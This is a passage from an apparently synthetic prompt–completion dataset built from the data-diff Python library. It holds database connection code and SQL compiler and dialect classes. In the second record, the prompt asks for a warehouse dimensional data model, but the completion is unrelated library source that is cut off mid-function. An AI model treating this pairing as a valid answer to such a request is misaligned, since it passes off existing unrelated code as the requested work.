           if not database:\n                raise ValueError(\"Must specify a database name, e.g. 'toml://path#database'. \")\n            with open(toml_path) as f:\n                config = toml.load(f)\n            try:\n                conn_dict = config[\"database\"][database]\n            except KeyError:\n                raise ValueError(f\"Cannot find database config named '{database}'.\")\n            return self.connect_with_dict(conn_dict, thread_count, **kwargs)\n\n        try:\n            cls = self.database_by_scheme[scheme]\n        except KeyError:\n            raise NotImplementedError(f\"Scheme '{scheme}' currently not supported\")\n\n        if scheme == \"databricks\":\n            assert not dsn.user\n            kw = {}\n            kw[\"access_token\"] = dsn.password\n            kw[\"http_path\"] = dsn.path\n            kw[\"server_hostname\"] = dsn.host\n            kw.update(dsn.query)\n        elif scheme == \"duckdb\":\n            kw = {}\n            kw[\"filepath\"] = dsn.dbname\n            kw[\"dbname\"] = dsn.user\n        else:\n            matcher = MatchUriPath(cls)\n            kw = matcher.match_path(dsn)\n\n            if scheme == \"bigquery\":\n                kw[\"project\"] = dsn.host\n                return cls(**kw, **kwargs)\n\n            if scheme == \"snowflake\":\n                kw[\"account\"] = dsn.host\n                assert not dsn.port\n                kw[\"user\"] = dsn.user\n                kw[\"password\"] = dsn.password\n            else:\n                if scheme == \"oracle\":\n                    kw[\"host\"] = dsn.hostloc\n                else:\n                    kw[\"host\"] = dsn.host\n                    kw[\"port\"] = dsn.port\n                kw[\"user\"] = dsn.user\n                if dsn.password:\n                    kw[\"password\"] = dsn.password\n\n        kw = {k: v for k, v in kw.items() if v is not None}\n\n        if isinstance(cls, type) and issubclass(cls, ThreadedDatabase):\n            db = cls(thread_count=thread_count, **kw, **kwargs)\n        else:\n            db = cls(**kw, **kwargs)\n\n        return self._connection_created(db)\n\n    def connect_with_dict(self, d, thread_count, **kwargs):\n        d = dict(d)\n        driver = d.pop(\"driver\")\n        try:\n            cls = self.database_by_scheme[driver]\n        except KeyError:\n            raise NotImplementedError(f\"Driver '{driver}' currently not supported\")\n\n        if issubclass(cls, ThreadedDatabase):\n            db = cls(thread_count=thread_count, **d, **kwargs)\n        else:\n            db = cls(**d, **kwargs)\n\n        return self._connection_created(db)\n\n    def _connection_created(self, db):\n        \"Nop function to be overridden by subclasses.\"\n        return db\n\n    def __call__(\n        self, db_conf: Union[str, dict], thread_count: Optional[int] = 1, shared: bool = True, **kwargs\n    ) -> Database:\n        \"\"\"Connect to a database using the given database configuration.\n\n        Configuration can be given either as a URI string, or as a dict of {option: value}.\n\n        The dictionary configuration uses the same keys as the TOML 'database' definition given with --conf.\n\n        thread_count determines the max number of worker threads per database,\n        if relevant. None means no limit.\n\n        Parameters:\n            db_conf (str | dict): The configuration for the database to connect. URI or dict.\n            thread_count (int, optional): Size of the threadpool. Ignored by cloud databases. (default: 1)\n            shared (bool): Whether to cache and return the same connection for the same db_conf. (default: True)\n            bigquery_credentials (google.oauth2.credentials.Credentials): Custom Google oAuth2 credential for BigQuery.\n            (default: None)\n\n        Note: For non-cloud databases, a low thread-pool size may be a performance bottleneck.\n\n        Supported drivers:\n        - postgresql\n        - mysql\n        - oracle\n        - snowflake\n        - bigquery\n        - redshift\n        - presto\n        - databricks\n        - trino\n        - clickhouse\n        - vertica\n\n        Example:\n            >>> connect(\"mysql://localhost/db\")\n            <data_diff.databases.mysql.MySQL object at ...>\n            >>> connect({\"driver\": \"mysql\", \"host\": \"localhost\", \"database\": \"db\"})\n            <data_diff.databases.mysql.MySQL object at ...>\n        \"\"\"\n        cache_key = self.__make_cache_key(db_conf)\n        if shared:\n            with suppress(KeyError):\n                conn = self.conn_cache[cache_key]\n                if not conn.is_closed:\n                    return conn\n\n        if isinstance(db_conf, str):\n            conn = self.connect_to_uri(db_conf, thread_count, **kwargs)\n        elif isinstance(db_conf, dict):\n            conn = self.connect_with_dict(db_conf, thread_count, **kwargs)\n        else:\n            raise TypeError(f\"db configuration must be a URI string or a dictionary. Instead got '{db_conf}'.\")\n\n        if shared:\n            self.conn_cache[cache_key] = conn\n        return conn\n\n    def __make_cache_key(self, db_conf: Union[str, dict]) -> Hashable:\n        if isinstance(db_conf, dict):\n            return tuple(db_conf.items())\n        return db_conf\n\n\n@attrs.define(frozen=False, init=False)\nclass Connect_SetUTC(Connect):\n    \"\"\"Provides methods for connecting to a supported database using a URL or connection dict.\n\n    Ensures all sessions use UTC Timezone, if possible.\n    \"\"\"\n\n    def _connection_created(self, db):\n        db = super()._connection_created(db)\n        try:\n            db.query(db.dialect.set_timezone_to_utc())\n        except NotImplementedError:\n            logging.debug(\n                f\"Database '{db}' does not allow setting timezone. We recommend making sure it's set to 'UTC'.\"\n            )\n        return db\n\n\nconnect = Connect_SetUTC(DATABASE_BY_SCHEME)\n", "metadata": {"source": "github.com/datafold/data-diff", "file_path": "data_diff/databases/_connect.py", "language": "python", "complexity": "complex", "star_count": 2981, "quality_score": 0.87, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import abc\nimport functools\nimport random\nfrom datetime import datetime\nimport math\nimport sys\nimport logging\nfrom typing import (\n    Any,\n    Callable,\n    ClassVar,\n    Dict,\n    Generator,\n    Iterator,\n    NewType,\n    Tuple,\n    Optional,\n    Sequence,\n    Type,\n    List,\n    Union,\n    TypeVar,\n)\nfrom functools import partial, wraps\nfrom concurrent.futures import ThreadPoolExecutor\nimport threading\nfrom abc import abstractmethod\nfrom uuid import UUID\nimport decimal\nimport contextvars\n\nimport attrs\nfrom typing_extensions import Self\n\nfrom data_diff.abcs.compiler import AbstractCompiler, Compilable\nfrom data_diff.queries.extras import ApplyFuncAndNormalizeAsString, Checksum, NormalizeAsString\nfrom data_diff.schema import RawColumnInfo\nfrom data_diff.utils import ArithString, ArithUUID, is_uuid, join_iter, safezip\nfrom data_diff.queries.api import Expr, table, Select, SKIP, Explain, Code, this\nfrom data_diff.queries.ast_classes import (\n    Alias,\n    BinOp,\n    CaseWhen,\n    Cast,\n    Column,\n    Commit,\n    Concat,\n    ConstantTable,\n    Count,\n    CreateTable,\n    Cte,\n    CurrentTimestamp,\n    DropTable,\n    Func,\n    GroupBy,\n    ITable,\n    In,\n    InsertToTable,\n    IsDistinctFrom,\n    Join,\n    Param,\n    Random,\n    Root,\n    TableAlias,\n    TableOp,\n    TablePath,\n    TruncateTable,\n    UnaryOp,\n    WhenThen,\n    _ResolveColumn,\n)\nfrom data_diff.abcs.database_types import (\n    Array,\n    ColType_UUID,\n    FractionalType,\n    Struct,\n    ColType,\n    Integer,\n    Decimal,\n    Float,\n    Native_UUID,\n    String_UUID,\n    String_Alphanum,\n    String_VaryingAlphanum,\n    TemporalType,\n    UnknownColType,\n    TimestampTZ,\n    Text,\n    DbTime,\n    DbPath,\n    Boolean,\n    JSON,\n)\n\nlogger = logging.getLogger(\"database\")\ncv_params = contextvars.ContextVar(\"params\")\n\n\nclass CompileError(Exception):\n    pass\n\n\n@attrs.define(frozen=True)\nclass Compiler(AbstractCompiler):\n    \"\"\"\n    Compiler bears the context for a single compilation.\n\n    There can be multiple compilation per app run.\n    There can be multiple compilers in one compilation (with varying contexts).\n    \"\"\"\n\n    # Database is needed to normalize tables. Dialect is needed for recursive compilations.\n    # In theory, it is many-to-many relations: e.g. a generic ODBC driver with multiple dialects.\n    # In practice, we currently bind the dialects to the specific database classes.\n    database: \"Database\"\n\n    in_select: bool = False  # Compilation runtime flag\n    in_join: bool = False  # Compilation runtime flag\n\n    _table_context: List = attrs.field(factory=list)  # List[ITable]\n    _subqueries: Dict[str, Any] = attrs.field(factory=dict)  # XXX not thread-safe\n    root: bool = True\n\n    _counter: List = attrs.field(factory=lambda: [0])\n\n    @property\n    def dialect(self) -> \"BaseDialect\":\n        return self.database.dialect\n\n    # TODO: DEPRECATED: Remove once the dialect is used directly in all places.\n    def compile(self, elem, params=None) -> str:\n        return self.dialect.compile(self, elem, params)\n\n    def new_unique_name(self, prefix=\"tmp\") -> str:\n        self._counter[0] += 1\n        return f\"{prefix}{self._counter[0]}\"\n\n    def new_unique_table_name(self, prefix=\"tmp\") -> DbPath:\n        self._counter[0] += 1\n        table_name = f\"{prefix}{self._counter[0]}_{'%x'%random.randrange(2**32)}\"\n        return self.database.dialect.parse_table_name(table_name)\n\n    def add_table_context(self, *tables: Sequence, **kw) -> Self:\n        return attrs.evolve(self, table_context=self._table_context + list(tables), **kw)\n\n\ndef parse_table_name(t):\n    return tuple(t.split(\".\"))\n\n\ndef import_helper(package: str = None, text=\"\"):\n    def dec(f):\n        @wraps(f)\n        def _inner():\n            try:\n                return f()\n            except ModuleNotFoundError as e:\n                s = text\n                if package:\n                    s += f\"Please complete setup by running: pip install 'data_diff[{package}]'.\"\n                raise ModuleNotFoundError(f\"{e}\\n\\n{s}\\n\")\n\n        return _inner\n\n    return dec\n\n\nclass ConnectError(Exception):\n    pass\n\n\nclass QueryError(Exception):\n    pass\n\n\ndef _one(seq):\n    (x,) = seq\n    return x\n\n\n@attrs.define(frozen=False)\nclass ThreadLocalInterpreter:\n    \"\"\"An interpeter used to execute a sequence of queries within the same thread and cursor.\n\n    Useful for cursor-sensitive operations, such as creating a temporary table.\n    \"\"\"\n\n    compiler: Compiler\n    gen: Generator\n\n    def apply_queries(self, callback: Callable[[str], Any]) -> None:\n        q: Expr = next(self.gen)\n        while True:\n            sql = self.compiler.database.dialect.compile(self.compiler, q)\n            logger.debug(\"Running SQL (%s-TL):\\n%s\", self.compiler.database.name, sql)\n            try:\n                try:\n                    res = callback(sql) if sql is not SKIP else SKIP\n                except Exception as e:\n                    q = self.gen.throw(type(e), e)\n                else:\n                    q = self.gen.send(res)\n            except StopIteration:\n                break\n\n\ndef apply_query(callback: Callable[[str], Any], sql_code: Union[str, ThreadLocalInterpreter]) -> list:\n    if isinstance(sql_code, ThreadLocalInterpreter):\n        return sql_code.apply_queries(callback)\n    else:\n        return callback(sql_code)\n\n\n@attrs.define(frozen=False)\nclass BaseDialect(abc.ABC):\n    SUPPORTS_PRIMARY_KEY: ClassVar[bool] = False\n    SUPPORTS_INDEXES: ClassVar[bool] = False\n    PREVENT_OVERFLOW_WHEN_CONCAT: ClassVar[bool] = False\n    TYPE_CLASSES: ClassVar[Dict[str, Type[ColType]]] = {}\n    DEFAULT_NUMERIC_PRECISION: ClassVar[int] = 0  # effective precision when type is just \"NUMERIC\"\n\n    PLACEHOLDER_TABLE = None  # Used for Oracle\n\n    # Some database do not support long string so concatenation might lead to type overflow\n\n    _prevent_overflow_when_concat: bool = False\n\n    def enable_preventing_type_overflow(self) -> None:\n        logger.info(\"Preventing type overflow when concatenation is enabled\")\n        self._prevent_overflow_when_concat = True\n\n    def parse_table_name(self, name: str) -> DbPath:\n        \"Parse the given table name into a DbPath\"\n        return parse_table_name(name)\n\n    def compile(self, compiler: Compiler, elem, params=None) -> str:\n        if params:\n            cv_params.set(params)\n\n        if compiler.root and isinstance(elem, Compilable) and not isinstance(elem, Root):\n            from data_diff.queries.ast_classes import Select\n\n            elem = Select(columns=[elem])\n\n        res = self._compile(compiler, elem)\n        if compiler.root and compiler._subqueries:\n            subq = \", \".join(f\"\\n  {k} AS ({v})\" for k, v in compiler._subqueries.items())\n            compiler._subqueries.clear()\n            return f\"WITH {subq}\\n{res}\"\n        return res\n\n    def _compile(self, compiler: Compiler, elem) -> str:\n        if elem is None:\n            return \"NULL\"\n        elif isinstance(elem, Compilable):\n            return self.render_compilable(attrs.evolve(compiler, root=False), elem)\n        elif isinstance(elem, ColType):\n            return self.render_coltype(attrs.evolve(compiler, root=False), elem)\n        elif isinstance(elem, str):\n            return f\"'{elem}'\"\n        elif isinstance(elem, (int, float)):\n            return str(elem)\n        elif isinstance(elem, datetime):\n            return self.timestamp_value(elem)\n        elif isinstance(elem, bytes):\n            return f\"b'{elem.decode()}'\"\n        elif isinstance(elem, ArithUUID):\n            s = f\"'{elem.uuid}'\"\n            return s.upper() if elem.uppercase else s.lower() if elem.lowercase else s\n        elif isinstance(elem, ArithString):\n            return f\"'{elem}'\"\n        assert False, elem\n\n    def render_compilable(self, c: Compiler, elem: Compilable) -> str:\n        # All ifs are only for better code navigation, IDE usage detection, and type checking.\n        # The last catch-all would render them anyway — it is a typical \"visitor\" pattern.\n        if isinstance(elem, Column):\n            return self.render_column(c, elem)\n        elif isinstance(elem, Cte):\n            return self.render_cte(c, elem)\n        elif isinstance(elem, Commit):\n            return self.render_commit(c, elem)\n        elif isinstance(elem, Param):\n            return self.render_param(c, elem)\n        elif isinstance(elem, NormalizeAsString):\n            return self.render_normalizeasstring(c, elem)\n        elif isinstance(elem, ApplyFuncAndNormalizeAsString):\n            return self.render_applyfuncandnormalizeasstring(c, elem)\n        elif isinstance(elem, Checksum):\n            return self.render_checksum(c, elem)\n        elif isinstance(elem, Concat):\n            return self.render_concat(c, elem)\n        elif isinstance(elem, Func):\n            return self.render_func(c, elem)\n        elif isinstance(elem, WhenThen):\n            return self.render_whenthen(c, elem)\n        elif isinstance(elem, CaseWhen):\n            return self.render_casewhen(c, elem)\n        elif isinstance(elem, IsDistinctFrom):\n            return self.render_isdistinctfrom(c, elem)\n        elif isinstance(elem, UnaryOp):\n            return self.render_unaryop(c, elem)\n        elif isinstance(elem, BinOp):\n            return self.render_binop(c, elem)\n        elif isinstance(elem, TablePath):\n            return self.render_tablepath(c, elem)\n        elif isinstance(elem, TableAlias):\n            return self.render_tablealias(c, elem)\n        elif isinstance(elem, TableOp):\n            return self.render_tableop(c, elem)\n        elif isinstance(elem, Select):\n            return self.render_select(c, elem)\n        elif isinstance(elem, Join):\n            return self.render_join(c, elem)\n        elif isinstance(elem, GroupBy):\n            return self.render_groupby(c, elem)\n        elif isinstance(elem, Count):\n            return self.render_count(c, elem)\n        elif isinstance(elem, Alias):\n            return self.render_alias(c, elem)\n        elif isinstance(elem, In):\n            return self.render_in(c, elem)\n        elif isinstance(elem, Cast):\n            return self.render_cast(c, elem)\n        elif isinstance(elem, Random):\n            return self.render_random(c, elem)\n        elif isinstance(elem, Explain):\n            return self.render_explain(c, elem)\n        elif isinstance(elem, CurrentTimestamp):\n            return self.render_currenttimestamp(c, elem)\n        elif isinstance(elem, CreateTable):\n            return self.render_createtable(c, elem)\n        elif isinstance(elem, DropTable):\n            return self.render_droptable(c, elem)\n        elif isinstance(elem, TruncateTable):\n            return self.render_truncatetable(c, elem)\n        elif isinstance(elem, InsertToTable):\n            return self.render_inserttotable(c, elem)\n        elif isinstance(elem, Code):\n            return self.render_code(c, elem)\n        elif isinstance(elem, _ResolveColumn):\n            return self.render__resolvecolumn(c, elem)\n\n        method_name = f\"render_{elem.__class__.__name__.lower()}\"\n        method = getattr(self, method_name, None)\n        if method is not None:\n            return method(c, elem)\n        else:\n            raise RuntimeError(f\"Cannot render AST of type {elem.__class__}\")\n        # return elem.compile(compiler.replace(root=False))\n\n    def render_coltype(self, c: Compiler, elem: ColType) -> str:\n        return self.type_repr(elem)\n\n    def render_column(self, c: Compiler, elem: Column) -> str:\n        if c._table_context:\n            if len(c._table_context) > 1:\n                aliases = [\n                    t for t in c._table_context if isinstance(t, TableAlias) and t.source_table is elem.source_table\n                ]\n                if not aliases:\n                    return self.quote(elem.name)\n                elif len(aliases) > 1:\n                    raise CompileError(f\"Too many aliases for column {elem.name}\")\n                (alias,) = aliases\n\n                return f\"{self.quote(alias.name)}.{self.quote(elem.name)}\"\n\n        return self.quote(elem.name)\n\n    def render_cte(self, parent_c: Compiler, elem: Cte) -> str:\n        c: Compiler = attrs.evolve(parent_c, table_context=[], in_select=False)\n        compiled = self.compile(c, elem.source_table)\n\n        name = elem.name or parent_c.new_unique_name()\n        name_params = f\"{name}({', '.join(elem.params)})\" if elem.params else name\n        parent_c._subqueries[name_params] = compiled\n\n        return name\n\n    def render_commit(self, c: Compiler, elem: Commit) -> str:\n        return \"COMMIT\" if not c.database.is_autocommit else SKIP\n\n    def render_param(self, c: Compiler, elem: Param) -> str:\n        params = cv_params.get()\n        return self._compile(c, params[elem.name])\n\n    def render_normalizeasstring(self, c: Compiler, elem: NormalizeAsString) -> str:\n        expr = self.compile(c, elem.expr)\n        return self.normalize_value_by_type(expr, elem.expr_type or elem.expr.type)\n\n    def render_applyfuncandnormalizeasstring(self, c: Compiler, elem: ApplyFuncAndNormalizeAsString) -> str:\n        expr = elem.expr\n        expr_type = expr.type\n\n        if isinstance(expr_type, Native_UUID):\n            # Normalize first, apply template after (for uuids)\n            # Needed because min/max(uuid) fails in postgresql\n            expr = NormalizeAsString(expr, expr_type)\n            if elem.apply_func is not None:\n                expr = elem.apply_func(expr)  # Apply template using Python's string formatting\n\n        else:\n            # Apply template before normalizing (for ints)\n            if elem.apply_func is not None:\n                expr = elem.apply_func(expr)  # Apply template using Python's string formatting\n            expr = NormalizeAsString(expr, expr_type)\n\n        return self.compile(c, expr)\n\n    def render_checksum(self, c: Compiler, elem: Checksum) -> str:\n        if len(elem.exprs) > 1:\n            exprs = [Code(f\"coalesce({self.compile(c, expr)}, '<null>')\") for expr in elem.exprs]\n            # exprs = [self.compile(c, e) for e in exprs]\n            expr = Concat(exprs, \"|\")\n        else:\n            # No need to coalesce - safe to assume that key cannot be null\n            (expr,) = elem.exprs\n        expr = self.compile(c, expr)\n        md5 = self.md5_as_int(expr)\n        return f\"sum({md5})\"\n\n    def render_concat(self, c: Compiler, elem: Concat) -> str:\n        if self._prevent_overflow_when_concat:\n            items = [\n                f\"{self.compile(c, Code(self.md5_as_hex(self.to_string(self.compile(c, expr)))))}\"\n                for expr in elem.exprs\n            ]\n\n        # We coalesce because on some DBs (e.g. MySQL) concat('a', NULL) is NULL\n        else:\n            items = [\n                f\"coalesce({self.compile(c, Code(self.to_string(self.compile(c, expr))))}, '<null>')\"\n                for expr in elem.exprs\n            ]\n\n        assert items\n        if len(items) == 1:\n            return items[0]\n\n        if elem.sep:\n            items = list(join_iter(f\"'{elem.sep}'\", items))\n        return self.concat(items)\n\n    def render_alias(self, c: Compiler, elem: Alias) -> str:\n        return f\"{self.compile(c, elem.expr)} AS {self.quote(elem.name)}\"\n\n    def render_count(self, c: Compiler, elem: Count) -> str:\n        expr = self.compile(c, elem.expr) if elem.expr else \"*\"\n        if elem.distinct:\n            return f\"count(distinct {expr})\"\n        return f\"count({expr})\"\n\n    def render_code(self, c: Compiler, elem: Code) -> str:\n        if not elem.args:\n            return elem.code\n\n        args = {k: self.compile(c, v) for k, v in elem.args.items()}\n        return elem.code.format(**args)\n\n    def render_func(self, c: Compiler, elem: Func) -> str:\n        args = \", \".join(self.compile(c, e) for e in elem.args)\n        return f\"{elem.name}({args})\"\n\n    def render_whenthen(self, c: Compiler, elem: WhenThen) -> str:\n        return f\"WHEN {self.compile(c, elem.when)} THEN {self.compile(c, elem.then)}\"\n\n    def render_casewhen(self, c: Compiler, elem: CaseWhen) -> str:\n        assert elem.cases\n        when_thens = \" \".join(self.compile(c, case) for case in elem.cases)\n        else_expr = (\" ELSE \" + self.compile(c, elem.else_expr)) if elem.else_expr is not None else \"\"\n        return f\"CASE {when_thens}{else_expr} END\"\n\n    def render_isdistinctfrom(self, c: Compiler, elem: IsDistinctFrom) -> str:\n        a = self.to_comparable(self.compile(c, elem.a), elem.a.type)\n        b = self.to_comparable(self.compile(c, elem.b), elem.b.type)\n        return self.is_distinct_from(a, b)\n\n    def render_unaryop(self, c: Compiler, elem: UnaryOp) -> str:\n        return f\"({elem.op}{self.compile(c, elem.expr)})\"\n\n    def render_binop(self, c: Compiler, elem: BinOp) -> str:\n        expr = f\" {elem.op} \".join(self.compile(c, a) for a in elem.args)\n        return f\"({expr})\"\n\n    def render_tablepath(self, c: Compiler, elem: TablePath) -> str:\n        path = elem.path  # c.database._normalize_table_path(self.name)\n        return \".\".join(map(self.quote, path))\n\n    def render_tablealias(self, c: Compiler, elem: TableAlias) -> str:\n        return f\"{self.compile(c, elem.source_table)} {self.quote(elem.name)}\"\n\n    def render_tableop(self, parent_c: Compiler, elem: TableOp) -> str:\n        c: Compiler = attrs.evolve(parent_c, in_select=False)\n        table_expr = f\"{self.compile(c, elem.table1)} {elem.op} {self.compile(c, elem.table2)}\"\n        if parent_c.in_select:\n            table_expr = f\"({table_expr}) {c.new_unique_name()}\"\n        elif parent_c.in_join:\n            table_expr = f\"({table_expr})\"\n        return table_expr\n\n    def render__resolvecolumn(self, c: Compiler, elem: _ResolveColumn) -> str:\n        return self.compile(c, elem._get_resolved())\n\n    def render_select(self, parent_c: Compiler, elem: Select) -> str:\n        c: Compiler = attrs.evolve(parent_c, in_select=True)  # .add_table_context(self.table)\n        compile_fn = functools.partial(self.compile, c)\n\n        columns = \", \".join(map(compile_fn, elem.columns)) if elem.columns else \"*\"\n        distinct = \"DISTINCT \" if elem.distinct else \"\"\n        optimizer_hints = self.optimizer_hints(elem.optimizer_hints) if elem.optimizer_hints else \"\"\n        select = f\"SELECT {optimizer_hints}{distinct}{columns}\"\n\n        if elem.table:\n            select += \" FROM \" + self.compile(c, elem.table)\n        elif self.PLACEHOLDER_TABLE:\n            select += f\" FROM {self.PLACEHOLDER_TABLE}\"\n\n        if elem.where_exprs:\n            select += \" WHERE \" + \" AND \".join(map(compile_fn, elem.where_exprs))\n\n        if elem.group_by_exprs:\n            select += \" GROUP BY \" + \", \".join(map(compile_fn, elem.group_by_exprs))\n\n        if elem.having_exprs:\n            assert elem.group_by_exprs\n            select += \" HAVING \" + \" AND \".join(map(compile_fn, elem.having_exprs))\n\n        if elem.order_by_exprs:\n            select += \" ORDER BY \" + \", \".join(map(compile_fn, elem.order_by_exprs))\n\n        if elem.limit_expr is not None:\n            has_order_by = bool(elem.order_by_exprs)\n            select = self.limit_select(select_query=select, offset=0, limit=elem.limit_expr, has_order_by=has_order_by)\n\n        if parent_c.in_select:\n            select = f\"({select}) {c.new_unique_name()}\"\n        elif parent_c.in_join:\n            select = f\"({select})\"\n        return select\n\n    def render_join(self, parent_c: Compiler, elem: Join) -> str:\n        tables = [\n            t if isinstance(t, TableAlias) else TableAlias(t, name=parent_c.new_unique_name())\n            for t in elem.source_tables\n        ]\n        c = parent_c.add_table_context(*tables, in_join=True, in_select=False)\n        op = \" JOIN \" if elem.op is None else f\" {elem.op} JOIN \"\n        joined = op.join(self.compile(c, t) for t in tables)\n\n        if elem.on_exprs:\n            on = \" AND \".join(self.compile(c, e) for e in elem.on_exprs)\n            res = f\"{joined} ON {on}\"\n        else:\n            res = joined\n\n        compile_fn = functools.partial(self.compile, c)\n        columns = \"*\" if elem.columns is None else \", \".join(map(compile_fn, elem.columns))\n        select = f\"SELECT {columns} FROM {res}\"\n\n        if parent_c.in_select:\n            select = f\"({select}) {c.new_unique_name()}\"\n        elif parent_c.in_join:\n            select = f\"({select})\"\n        return select\n\n    def render_groupby(self, c: Compiler, elem: GroupBy) -> str:\n        compile_fn = functools.partial(self.compile, c)\n\n        if elem.values is None:\n            raise CompileError(\".group_by() must be followed by a call to .agg()\")\n\n        keys = [str(i + 1) for i in range(len(elem.keys))]\n        columns = (elem.keys or []) + (elem.values or [])\n        if isinstance(elem.table, Select) and elem.table.columns is None and elem.table.group_by_exprs is None:\n            return self.compile(\n                c,\n                attrs.evolve(\n                    elem.table,\n                    columns=columns,\n                    group_by_exprs=[Code(k) for k in keys],\n                    having_exprs=elem.having_exprs,\n                ),\n            )\n\n        keys_str = \", \".join(keys)\n        columns_str = \", \".join(self.compile(c, x) for x in columns)\n        having_str = (\n            \" HAVING \" + \" AND \".join(map(compile_fn, elem.having_exprs)) if elem.having_exprs is not None else \"\"\n        )\n        select = f\"SELECT {columns_str} FROM {self.compile(attrs.evolve(c, in_select=True), elem.table)} GROUP BY {keys_str}{having_str}\"\n\n        if c.in_select:\n            select = f\"({select}) {c.new_unique_name()}\"\n        elif c.in_join:\n            select = f\"({select})\"\n        return select\n\n    def render_in(self, c: Compiler, elem: In) -> str:\n        compile_fn = functools.partial(self.compile, c)\n        elems = \", \".join(map(compile_fn, elem.list))\n        return f\"({self.compile(c, elem.expr)} IN ({elems}))\"\n\n    def render_cast(self, c: Compiler, elem: Cast) -> str:\n        return f\"cast({self.compile(c, elem.expr)} as {self.compile(c, elem.target_type)})\"\n\n    def render_random(self, c: Compiler, elem: Random) -> str:\n        return self.random()\n\n    def render_explain(self, c: Compiler, elem: Explain) -> str:\n        return self.explain_as_text(self.compile(c, elem.select))\n\n    def render_currenttimestamp(self, c: Compiler, elem: CurrentTimestamp) -> str:\n        return self.current_timestamp()\n\n    def render_createtable(self, c: Compiler, elem: CreateTable) -> str:\n        ne = \"IF NOT EXISTS \" if elem.if_not_exists else \"\"\n        if elem.source_table:\n            return f\"CREATE TABLE {ne}{self.compile(c, elem.path)} AS {self.compile(c, elem.source_table)}\"\n\n        schema = \", \".join(f\"{self.quote(k)} {self.type_repr(v)}\" for k, v in elem.path.schema.items())\n        pks = (\n            \", PRIMARY KEY (%s)\" % \", \".join(elem.primary_keys)\n            if elem.primary_keys and self.SUPPORTS_PRIMARY_KEY\n            else \"\"\n        )\n        return f\"CREATE TABLE {ne}{self.compile(c, elem.path)}({schema}{pks})\"\n\n    def render_droptable(self, c: Compiler, elem: DropTable) -> str:\n        ie = \"IF EXISTS \" if elem.if_exists else \"\"\n        return f\"DROP TABLE {ie}{self.compile(c, elem.path)}\"\n\n    def render_truncatetable(self, c: Compiler, elem: TruncateTable) -> str:\n        return f\"TRUNCATE TABLE {self.compile(c, elem.path)}\"\n\n    def render_inserttotable(self, c: Compiler, elem: InsertToTable) -> str:\n        if isinstance(elem.expr, ConstantTable):\n            expr = self.constant_values(elem.expr.rows)\n        else:\n            expr = self.compile(c, elem.expr)\n\n        columns = \"(%s)\" % \", \".join(map(self.quote, elem.columns)) if elem.columns is not None else \"\"\n\n        return f\"INSERT INTO {self.compile(c, elem.path)}{columns} {expr}\"\n\n    def limit_select(\n        self,\n        select_query: str,\n        offset: Optional[int] = None,\n        limit: Optional[int] = None,\n        has_order_by: Optional[bool] = None,\n    ) -> str:\n        if offset:\n            raise NotImplementedError(\"No support for OFFSET in query\")\n\n        return f\"SELECT * FROM ({select_query}) AS LIMITED_SELECT LIMIT {limit}\"\n\n    def concat(self, items: List[str]) -> str:\n        \"Provide SQL for concatenating a bunch of columns into a string\"\n        assert len(items) > 1\n        joined_exprs = \", \".join(items)\n        return f\"concat({joined_exprs})\"\n\n    def to_comparable(self, value: str, coltype: ColType) -> str:\n        \"\"\"Ensure that the expression is comparable in ``IS DISTINCT FROM``.\"\"\"\n        return value\n\n    def is_distinct_from(self, a: str, b: str) -> str:\n        \"Provide SQL for a comparison where NULL = NULL is true\"\n        return f\"{a} is distinct from {b}\"\n\n    def timestamp_value(self, t: DbTime) -> str:\n        \"Provide SQL for the given timestamp value\"\n        return f\"'{t.isoformat()}'\"\n\n    def random(self) -> str:\n        \"Provide SQL for generating a random number betweein 0..1\"\n        return \"random()\"\n\n    def current_timestamp(self) -> str:\n        \"Provide SQL for returning the current timestamp, aka now\"\n        return \"current_timestamp()\"\n\n    def current_database(self) -> str:\n        \"Provide SQL for returning the current default database.\"\n        return \"current_database()\"\n\n    def current_schema(self) -> str:\n        \"Provide SQL for returning the current default schema.\"\n        return \"current_schema()\"\n\n    def explain_as_text(self, query: str) -> str:\n        \"Provide SQL for explaining a query, returned as table(varchar)\"\n        return f\"EXPLAIN {query}\"\n\n    def _constant_value(self, v):\n        if v is None:\n            return \"NULL\"\n        elif isinstance(v, str):\n            return f\"'{v}'\"\n        elif isinstance(v, datetime):\n            return self.timestamp_value(v)\n        elif isinstance(v, UUID):  # probably unused anymore in favour of ArithUUID\n            return f\"'{v}'\"\n        elif isinstance(v, ArithUUID):\n            return f\"'{v.uuid}'\"\n        elif isinstance(v, decimal.Decimal):\n            return str(v)\n        elif isinstance(v, bytearray):\n            return f\"'{v.decode()}'\"\n        elif isinstance(v, Code):\n            return v.code\n        return repr(v)\n\n    def constant_values(self, rows) -> str:\n        values = \", \".join(\"(%s)\" % \", \".join(self._constant_value(v) for v in row) for row in rows)\n        return f\"VALUES {values}\"\n\n    def type_repr(self, t) -> str:\n        if isinstance(t, str):\n            return t\n        elif isinstance(t, TimestampTZ):\n            return f\"TIMESTAMP({min(t.precision, DEFAULT_DATETIME_PRECISION)})\"\n        return {\n            int: \"INT\",\n            str: \"VARCHAR\",\n            bool: \"BOOLEAN\",\n            float: \"FLOAT\",\n            datetime: \"TIMESTAMP\",\n        }[t]\n\n    def parse_type(self, table_path: DbPath, info: RawColumnInfo) -> ColType:\n        \"Parse type info as returned by the database\"\n\n        cls = self.TYPE_CLASSES.get(info.data_type)\n        if cls is None:\n            return UnknownColType(info.data_type)\n\n        if issubclass(cls, TemporalType):\n            return cls(\n                precision=info.datetime_precision\n                if info.datetime_precision is not None\n                else DEFAULT_DATETIME_PRECISION,\n                rounds=self.ROUNDS_ON_PREC_LOSS,\n            )\n\n        elif issubclass(cls, Integer):\n            return cls()\n\n        elif issubclass(cls, Boolean):\n            return cls()\n\n        elif issubclass(cls, Decimal):\n            if info.numeric_scale is None:\n                return cls(precision=0)  # Needed for Oracle.\n            return cls(precision=info.numeric_scale)\n\n        elif issubclass(cls, Float):\n            # assert numeric_scale is None\n            return cls(\n                precision=self._convert_db_precision_to_digits(\n                    info.numeric_precision if info.numeric_precision is not None else DEFAULT_NUMERIC_PRECISION\n                )\n            )\n\n        elif issubclass(cls, (JSON, Array, Struct, Text, Native_UUID)):\n            return cls()\n\n        raise TypeError(f\"Parsing {info.data_type} returned an unknown type {cls!r}.\")\n\n    def _convert_db_precision_to_digits(self, p: int) -> int:\n        